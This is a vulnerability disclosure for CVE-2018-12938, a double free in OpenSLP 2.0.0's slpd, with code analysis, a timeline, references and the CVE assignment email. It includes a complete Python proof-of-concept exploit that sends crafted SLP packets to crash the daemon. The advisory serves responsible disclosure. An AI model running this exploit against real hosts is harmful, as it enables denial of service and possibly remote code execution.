@@ -1,0 +1,351 @@
+'''
+     _       _      _         _   _        ___
+ ___| |___ _| |   _| |___ _ _| |_| |___   |  _|___ ___ ___
+|_ -| | . | . |  | . | . | | | . | | -_|  |  _|  _| -_| -_|
+|___|_|  _|___|  |___|___|___|___|_|___|  |_| |_| |___|___|
+      |_|
+
+2018-06-28
+
+SLPD DOUBLE FREE 
+================
+
+CVE-2018-12938
+
+An issue was found in openslp-2.0.0 that can be used to induce a double free bug or memory corruption by
+corrupting glibc's doubly-linked memory chunk list. At the time of writing, no patch has been made available.
+The issue was discovered by Magnus Klaaborg Stubman.
+
+On line 409 of slpd_process.c, the *sendbuf pointer is copied to result.
+On line 251, the first reallocation takes place, potentially free()ing the memory if
+it was moved as part of the reallocation.
+On line 547, the second reallocation is done, again potentially free()ing the memory
+if it has to be moved as part of the reallocation, potentially resulting in a double free bug.
+
+Code snippets from openslp-2.0.0/slpd/slpd_process.c:
+
+  237 static int ProcessDASrvRqst(SLPMessage * message, SLPBuffer * sendbuf, int errorcode)
+  238 {
+  ..
+  243    size_t initial_buffer_size = 4096;
+  ..
+  246    /* Special case for when libslp asks slpd (through the loopback) about
+  247     * a known DAs. Fill sendbuf with DAAdverts from all known DAs.
+  248     */
+  249    if (SLPNetIsLoopback(&message->peer))
+  250    {
+  251       *sendbuf = SLPBufferRealloc(*sendbuf, initial_buffer_size); <-- first reallocation
+  ..
+  402 static int ProcessSrvRqst(SLPMessage * message, SLPBuffer * sendbuf,
+  403       int errorcode)
+  404 {
+  405    int i;
+  406    SLPUrlEntry * urlentry;
+  407    SLPDDatabaseSrvRqstResult * db = 0;
+  408    size_t size = 0;
+  409    SLPBuffer result = *sendbuf; <-- pointer is copied
+  ..
+  460    /* check to to see if a this is a special SrvRqst */
+  461    if (SLPCompareString(message->body.srvrqst.srvtypelen,
+  462          message->body.srvrqst.srvtype, 23, SLP_DA_SERVICE_TYPE) == 0)
+  463    {
+  464       errorcode = ProcessDASrvRqst(message, sendbuf, errorcode); <-- sendbuf passed to function
+  ..
+  546    /* reallocate the result buffer */
+  547    result = SLPBufferRealloc(result, size); <-- second reallocation
+
+
+PROOF OF CONCEPT
+================
+
+The following patch can be used to understand the reallocation behavior:
+
+  diff --git a/common/slp_buffer.c b/common/slp_buffer.c
+  index 1cab3f5..b3e3ff1 100644
+  --- a/common/slp_buffer.c
+  +++ b/common/slp_buffer.c
+  @@ -104,7 +104,9 @@ SLPBuffer SLPBufferRealloc(SLPBuffer buf, size_t size)
+            /* Allocate one extra byte for null terminating strings that
+             * occupy the last field of the buffer.
+             */
+  +         printf("xrealloc(%p, %u) = ", buf, sizeof(struct _SLPBuffer) + size + 1);
+            result = xrealloc(buf, sizeof(struct _SLPBuffer) + size + 1);
+  +         printf(" = %p\n", result);
+            if (result)
+                result->allocated = size;
+         }
+
+In order to induce a double-free condition the heap must be massaged
+such that the reallocation attempts to move memory around.
+A proof of concept exploit was developed that demonstrates the vulnerability:
+
+  $ sudo python openslp-2.0.0-double-free-poc.py
+  Proof-of-concept heap massager and double-free trigger for openslp-2.0.0 slpd
+  Run this script before launching slpd
+  [-] Waiting for multicast service request from slpd...
+  [+] Got request! Sending reply to 192.168.245.191 427...
+  [-] Sending first Service Request to 127.0.0.1:427 from 127.0.0.1:53309...
+  [-] Waiting for response...
+  [+] Received 71 bytes from 127.0.0.1:427
+  [-] Sending  packet to (multicast) 239.255.255.253:427 from 192.168.245.191:41965...
+  [+] Got request! Sending reply to 192.168.245.191 41965...
+  [-] Waiting for response from bad-multicast-server.py...
+  [+] Received 71 bytes from 192.168.245.191:427
+  [-] Connecting to 192.168.245.191:427...
+  [+] Connected. Sending...
+  [-] Sent packet to 192.168.245.191:427 from 192.168.245.191:39914...
+  [+] Done!
+  $ sudo ./slpd/slpd -d -c etc/slp.conf
+  ...
+  xrealloc(0x137ba50, 1449) =  = 0x138dd30
+  xrealloc(0x137ba50, 69) =
+  *** Error in `./slpd/slpd': double free or corruption (fasttop): 0x000000000137ba50 ***
+
+As shown in slpd's output prior to crashing, 0x138dd30 is returned when 0x137ba50 is
+reallocated, thus free()ing 0x137ba50. However, afterwards 0x137ba50 is yet again reallocated,
+and due to the layout of the heap, free()d a second time, resulting in a double free.
+
+EXPLOIT
+=======
+
+dumpco.re/exploits/openslp-2.0.0-double-free-poc.py:
+'''
+
+  import os
+  import sys
+  import struct
+  import socket
+
+  targetIp = "192.168.245.194"
+
+  abuf = ("\x02\x08\xff\xff\xff\x00\x00\x00\x00\x00\x58\x27\x00\x02\x65\x6e" +
+     "\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+     "\x00\x00\x00\x00\x00\x00\x00")
+
+  mcastserversock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+  mcastserversock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+  mcastserversock.bind(('239.255.255.253', 427))
+  mreq = struct.pack("4sl", socket.inet_aton('239.255.255.253'), socket.INADDR_ANY)
+  mcastserversock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+
+  print "Proof-of-concept heap massager and double-free trigger for openslp-2.0.0 slpd\nRun this script before launching slpd and remember to update targetIp variable."
+  print "[-] Waiting for multicast service request from slpd..."
+  data, addr = mcastserversock.recvfrom(1024)
+  print "[+] Got request! Sending reply to " + addr[0] + " " + str(addr[1]) + "..."
+  mcastserversock.sendto(abuf, (addr[0], addr[1]))
+
+  localhostsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+  localhostsock.bind(('127.0.0.1', 0))
+  print "[-] Sending first Service Request to 127.0.0.1:427 from 127.0.0.1:" + str(localhostsock.getsockname()[1]) + "..."
+
+  buf = ("\x02\x01\x00\x00\x31\x00\x00\x00\x00\x00\x66\x0b\x00\x02\x65\x6e" +
+         "\x00\x00\x00\x17\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x72\x65" +
+         "\x63\x74\x6f\x72\x79\x2d\x61\x67\x65\x6e\x74\x00\x00\x00\x00\x00" +
+         "\x00")
+
+  localhostsock.sendto(buf, ('127.0.0.1', 427))
+  print "[-] Waiting for response..."
+  data, addr = localhostsock.recvfrom(1024)
+  print "[+] Received " + str(len(data)) + " bytes from " + addr[0] + ":" + str(addr[1])
+
+  clientsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+  clientsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+  clientsock.bind(('0.0.0.0', 0))
+  print "[-] Sending  packet to (multicast) 239.255.255.253:427 from " + targetIp + ":" + str(clientsock.getsockname()[1]) + "..."
+  mreq = struct.pack("4sl", socket.inet_aton('239.255.255.253'), socket.INADDR_ANY)
+  clientsock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
+
+  buf = ("\x02\x01\x00\x00\x38\x20\x00\x00\x00\x00\x66\x0c\x00\x02\x65\x6e" +
+         "\x00\x00\x00\x17\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x72\x65" +
+         "\x63\x74\x6f\x72\x79\x2d\x61\x67\x65\x6e\x74\x00\x07\x44\x45\x46" +
+         "\x41\x55\x4c\x54\x00\x00\x00\x00")
+
+  clientsock.sendto(buf, ('239.255.255.253', 427))
+
+  data, addr = mcastserversock.recvfrom(1024)
+  print "[+] Got request! Sending reply to " + addr[0] + " " + str(addr[1]) + "..."
+  mcastserversock.sendto(abuf, (addr[0], addr[1]))
+
+  clientsock.close()
+  print "[+] Received " + str(len(data)) + " bytes from " + addr[0] + ":" + str(addr[1])
+
+  buf = ("\x02\x01\x00\x00\x38\x00\x00\x00\x00\x00\x66\x0d\x00\x02\x65\x6e" +
+         "\x00\x00\x00\x17\x73\x65\x72\x76\x69\x63\x65\x3a\x64\x69\x72\x65" +
+         "\x63\x74\x6f\x72\x79\x2d\x61\x67\x65\x6e\x74\x00\x07\x44\x45\x46" +
+         "\x41\x55\x4c\x54\x00\x00\x00\x00")
+
+  tcpclientsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  print "[-] Connecting to " + targetIp + ":427..."
+  tcpclientsock.connect((targetIp, 427))
+  print "[+] Connected. Sending..."
+  tcpclientsock.send(buf)
+  print "[-] Sent packet to " + targetIp + ":427 from " + targetIp + ":" + str(tcpclientsock.getsockname()[1]) + "...\n[+] Done!"
+
+'''
+IMPACT
+======
+
+Although not attempted, the issue may be exploitable such that a remote unauthenticated
+attacker may gain Remote Code Execution, since double frees have been known to be exploitable
+leading to RCE. As such, this issue may score 'high' on CVSS.
+
+TIMELINE
+========
+
+2018-01-22 Discovery
+2018-01-23 Vendor notification
+2018-06-28 Public disclosure
+2018-06-29 MITRE assigned CVE-ID
+
+REFERENCES
+==========
+
+- nvd.nist.gov/vuln/detail/CVE-2018-12938
+- cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12938
+- vuldb.com/?id.120078
+- securityfocus.com/bid/104576
+- access.redhat.com/security/cve/cve-2018-12938
+- bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-12938
+
+
+CVE ASSIGNMENT
+==============
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
+
+[Suggested description]
+slpd_process.c in OpenSLP 2.0.0 has a double free resulting in
+denial of service (daemon crash) or possibly unauthenticated remote code execution.
+
+------------------------------------------
+
+[Additional Information]
+A proof of concept exploit has been developed, but due to size
+constraints of this form it cannot sent. I can provide it over e-mail
+if needed. I originally reported this issue to the maintainers on
+2018-01-23 but they have failed to provide a patch. I am publicly
+disclosing the issue as soon as a CVE-ID is assigned.
+
+Vulnerability:
+On line 409 of slpd_process.c, the *sendbuf pointer is copied to result.
+On line 251, the first reallocation takes place, potentially free()ing the memory if
+it was moved as part of the reallocation.
+On line 547, the second reallocation is done, again potentially free()ing the memory
+if it has to be moved as part of the reallocation, potentially resulting in a double free bug.
+
+Code snippets from openslp-2.0.0/slpd/slpd_process.c:
+
+237 static int ProcessDASrvRqst(SLPMessage * message, SLPBuffer * sendbuf, int errorcode)
+238 {
+...
+243    size_t initial_buffer_size = 4096;
+...
+246    /* Special case for when libslp asks slpd (through the loopback) about
+247     * a known DAs. Fill sendbuf with DAAdverts from all known DAs.
+248     */
+249    if (SLPNetIsLoopback(&message->peer))
+250    {
+251       *sendbuf = SLPBufferRealloc(*sendbuf, initial_buffer_size); <-- first reallocation
+...
+402 static int ProcessSrvRqst(SLPMessage * message, SLPBuffer * sendbuf,
+403       int errorcode)
+404 {
+405    int i;
+406    SLPUrlEntry * urlentry;
+407    SLPDDatabaseSrvRqstResult * db = 0;
+408    size_t size = 0;
+409    SLPBuffer result = *sendbuf; <-- pointer is copied
+...
+460    /* check to to see if a this is a special SrvRqst */
+461    if (SLPCompareString(message->body.srvrqst.srvtypelen,
+462          message->body.srvrqst.srvtype, 23, SLP_DA_SERVICE_TYPE) == 0)
+463    {
+464       errorcode = ProcessDASrvRqst(message, sendbuf, errorcode); <-- sendbuf passed to function
+...
+546    /* reallocate the result buffer */
+547    result = SLPBufferRealloc(result, size); <-- second reallocation
+
+------------------------------------------
+
+[VulnerabilityType Other]
+Double free
+
+------------------------------------------
+
+[Vendor of Product]
+openslp.org
+
+------------------------------------------
+
+[Affected Product Code Base]
+openslp - 2.0.0 and earlier
+
+------------------------------------------
+
+[Affected Component]
+openslp-2.0.0/slpd/slpd_process.c
+
+------------------------------------------
+
+[Attack Type]
+Remote
+
+------------------------------------------
+
+[Impact Code execution]
+true
+
+------------------------------------------
+
+[Impact Denial of Service]
+true
+
+------------------------------------------
+
+[Attack Vectors]
+To exploit the vulnerability, a malicious user must send a malformed SLP packet to the target system.
+
+------------------------------------------
+
+[Has vendor confirmed or acknowledged the vulnerability?]
+true
+
+------------------------------------------
+
+[Discoverer]
+Magnus Klaaborg Stubman
+
+------------------------------------------
+
+[Reference]
+dumpco.re/blog/openslp-2.0.0-double-free
+
+Use CVE-2018-12938.
+
+
+- --
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+ cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJbNWOrAAoJEA2h+fVryJLoqocP/iwnxfQU+gKSj4HGdxTI6hZt
+raqOEC4/Pgpg7Ha2tU5jw1STfUnesPk0tDMfwSioTDYQCHWn9wWg2Yg7SIzovH0t
+wjdI0L//THgMVjnAwZroLcoWGFUCOVu8umjcXO15y0DhllCEoSzjNXKcRKPOA0ix
+Ej2Pc15umaqNO1HsLnvOOhvp1wMWOXsPNVnC+YrExbIA9FA1+bdUGSDRY4qpcvuh
+m+ZLzPdlu2WQJDB11TfEYrfEQkbwcOUGgvVY/Gr3zFBvviP8tf69IsKVkGHKdZ3w
+6+Ev/GMTWXH0Zg36Oxpxe4jVDmm0gKJr7JmLNB9FhhKMYHIqG8k2pmhGzjDJ7emC
+P7o/dpuRjXbIw4JWxjju7fDrWP0pbqD9Ezu3jiqfjSFypCFhSCbY+pGZEOS1/Myt
+MdW7jsfUXZnZXudq1ihttEJMBxbsOdbZo/XnfSF/77AX74dJn1Irsq972iUF5wpK
+iIlM6dGrBwVO3igmQr6821+F5tJ45GuR9cxUOtNJsUIJ0sULzaiZEspXTbu/hxlt
+SjKGrqppZm0jt89d8i7ugkhDZCPODU/ELjJtu58Bd5SG5AtF0E80gMIDEOmq6qj2
+oyUrmCaRHghHtzwJpYzRwMwjCMRg0XnuJ4YM0NQjiDYXgS6+yh/56t8M/9PLt4Nj
+AKXh3pI64gZWkAXJexiW
+=iMrL
+-----END PGP SIGNATURE-----
+'''
